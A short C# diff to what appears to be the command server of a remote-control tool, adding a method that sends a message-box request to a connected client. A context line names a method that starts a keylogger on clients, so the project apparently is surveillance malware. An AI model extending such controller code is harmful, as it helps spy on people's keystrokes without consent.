@@ -25,7 +25,12 @@ namespace Server.Services
             var json = JsonHelper.Serialize(request);
             await connection.SendAsync(json);
         }
-
+        public async Task SendMessageBoxRequestAsync(ServerClientConnection connection, MessageBoxRequest request)
+        {
+            request.ClientId = connection.Id;
+            var json = JsonHelper.Serialize(request);
+            await connection.SendAsync(json);
+        }
         //-------------------------------------//
 
         public async Task SendKeyLoggerStartAsync(ServerClientConnection connection, KeyLoggerStart request)
